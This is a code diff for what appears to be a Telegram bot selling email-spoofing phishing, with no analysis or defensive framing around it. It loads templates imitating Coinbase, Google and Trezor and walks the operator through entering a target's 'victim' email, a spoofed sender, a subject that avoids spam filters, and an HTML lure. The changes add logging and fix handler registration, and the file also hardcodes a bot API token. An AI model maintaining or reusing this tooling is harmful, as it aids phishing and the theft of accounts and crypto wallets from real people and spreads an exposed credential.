@@ -18,7 +18,16 @@ from datetime import datetime
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
-
+import logging
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
+    handlers=[
+        logging.FileHandler("debug.log", mode='a', encoding='utf-8'),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+logger = logging.getLogger(__name__)
 sys.stdout.reconfigure(encoding="utf-8")
 
 
@@ -66,6 +75,8 @@ HTML_SECURE_TEMPLATE_PATH = "coinbase_secure_template.html"
 HTML_GOOGLE_TEMPLATE_PATH = "google_template.html"
 HTML_TREZOR_TEMPLATE_PATH = "trezor.html"
 HTML_DELAY_TEMPLATE_PATH = "coinbase_transaction.html"
+
+
 
 def load_email_counts():
     global global_email_count, user_email_counts
@@ -197,16 +208,25 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return ConversationHandler.END
 
 async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Initiates the custom email flow."""
-    await update.message.reply_text("Start by entering the email address of the target! (eg. niggaspoofer@juggalot.com) Cancel this flow using /cancel:")
-
-    return CUSTOM_VICTIM_EMAIL
+    try:
+        logger.info("Custom mail conversation STARTED")
+        await update.message.reply_text("Enter target email...")
+        return CUSTOM_VICTIM_EMAIL
+    except Exception as e:
+        logger.error(f"Error in custom_mail: {e}", exc_info=True)
+        return ConversationHandler.END
 
 async def get_custom_victim_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the victim email and asks for the email subject."""
-    context.user_data["victim_email"] = update.message.text
-    await update.message.reply_text("Enter the subject (header) of the email: (Avoid spam words!)")
-    return CUSTOM_SUBJECT
+    try:
+        victim_email = update.message.text
+        logger.info(f"Received victim email: {victim_email}")
+        context.user_data["victim_email"] = victim_email
+        await update.message.reply_text("Enter email SUBJECT:")
+        return CUSTOM_SUBJECT
+    except Exception as e:
+        logger.error(f"Error in get_custom_victim_email: {e}", exc_info=True)
+        await update.message.reply_text("⚠️ An error occurred. Restart with /start")
+        return ConversationHandler.END
 
 async def get_custom_subject(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Stores the subject and asks for the sender name."""
@@ -268,6 +288,7 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     else:
         await update.message.reply_text("Please upload a valid HTML file.")
         return CUSTOM_HTML
+
 
 
 # Add the new command handler for broadcasting messages
@@ -356,34 +377,44 @@ async def account_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 
 
 
-custom_mail_handler = ConversationHandler(
-    entry_points=[MessageHandler(filters.Regex(r'^Spoofer$'), custom_mail)],  # Changed to MessageHandler
-    states={
-        CUSTOM_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)],
-        CUSTOM_SUBJECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)],
-        CUSTOM_SENDER_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_sender_name)],
-        CUSTOM_DISPLAY_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_display_email)],
-        CUSTOM_HTML: [MessageHandler(filters.Document.ALL & ~filters.COMMAND, get_custom_html)],
-    },
-    fallbacks=[CommandHandler("cancel", cancel)],
-)
 
 
 def main():
     load_email_counts()
 
+
     TOKEN = "8157065921:AAGzZPW0q-2aSs4Pcg_E0qBGV2v3RkHVjEA"
     application = ApplicationBuilder().token(TOKEN).build()
-
+    custom_mail_handler = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex(r'^Spoofer$'), custom_mail)],
+        states={
+            CUSTOM_VICTIM_EMAIL: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)
+            ],
+            CUSTOM_SUBJECT: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)
+            ],
+            CUSTOM_SENDER_NAME: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_sender_name)
+            ],
+            CUSTOM_DISPLAY_EMAIL: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_display_email)
+            ],
+            CUSTOM_HTML: [
+                MessageHandler(filters.Document.ALL & ~filters.COMMAND, get_custom_html)
+            ],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+    )
+    # Add the custom_mail_handler first to prioritize conversation states
+    application.add_handler(custom_mail_handler)
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("donate", donate))
     application.add_handler(CommandHandler("id", get_user_id))
-    application.add_handler(custom_mail_handler)  # Uncommented line
     application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Donate)$"), donate))
     application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Account)$"), account_info))
     application.add_handler(broadcast_handler)
-    # Removed the redundant MessageHandler for "Spoofer"
     application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Help)$"), help_command))
     application.add_handler(CommandHandler("cancel", cancel))
 
